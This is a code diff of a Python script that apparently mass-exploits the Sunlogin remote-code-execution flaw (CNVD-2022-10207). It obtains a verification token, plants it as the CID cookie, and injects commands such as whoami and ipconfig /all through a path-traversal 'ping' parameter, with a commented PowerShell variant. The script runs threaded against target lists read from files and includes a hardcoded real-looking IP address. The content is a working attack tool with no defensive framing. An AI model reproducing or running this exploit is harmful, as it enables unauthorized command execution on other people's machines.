@@ -22,7 +22,7 @@ result_path=file_path/'result'/f'{filename}.txt'
 proxy={
     'http':'http://127.0.0.1:7890',
     'https':'http://127.0.0.1:7890',}
-def exploits(url, index):    #写入MongDB 数据库
+def exploit(url, index):    #写入MongDB 数据库
     try:
         dic={}
         dic['url']=url
@@ -30,10 +30,8 @@ def exploits(url, index):    #写入MongDB 数据库
         reps = json.loads(requests.get(vul_url, verify=False, timeout=5).text)
         verify_string = (reps['verify_string'])
         cookies = {"CID": verify_string}
-        # print(cookies)
         # commands=['whoami','net user','ipconfig /all',"netstat -an ",'systeminfo','tasklist']
-        commands=['whoami']
-        # commands=['ipconfig /all']
+        commands=['ipconfig /all']
         for command in commands:
             poc11 = url + "/check?cmd=ping../../../../../../windows/system32/" + command
             # poc11 = url + "/check?cmd=ping..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fsystem32%2FWindowsPowerShell%2Fv1.0%2Fpowershell.exe+%20whoami"
@@ -47,7 +45,7 @@ def exploits(url, index):    #写入MongDB 数据库
     except Exception as e:
         pass
 
-def exploit(url, index):
+def exploits(url, index):
     try:
         vul_url = url + "/cgi-bin/rpc?action=verify-haras"
         reps = json.loads(requests.get(vul_url, verify=False, timeout=5).text)
@@ -79,13 +77,13 @@ url='http://117.172.165.247:1029'   #cjngy.com
 
 
 threads = []
-with open(r'D:\Downloads\tmp\sunlight.txt', 'r') as file:
+# with open(r'D:\Downloads\tmp\sunlight.txt', 'r') as file:
 # with open(r'D:\C#\VSCODE\python\POC_EXP\代码执行_命令执行\Windows\CNVD-2022-10207向日葵RCE\file.txt', 'r') as file:
-# with result_path.open('r') as file:
+with result_path.open('r') as file:
     urls = []
     for index, line in enumerate(file):
-        start = 4653
-        end = start+10100
+        start =0
+        end = start+400
 
         if index >= start and index <= end:
             urls.append(line.strip(line_break))
@@ -93,14 +91,14 @@ with open(r'D:\Downloads\tmp\sunlight.txt', 'r') as file:
             # break
             ip = line.strip(line_break)
             print(index, ip)
-            # exploit(ip,index)
+            exploit(ip,index)
 
             thread = threading.Thread(target=exploit, args=(ip, index,))
             threads.append(thread)
 pool_size = 15
 # print(urls)
 
-test = 'm'
+test = 'mt'
 
 
 if test=='t':
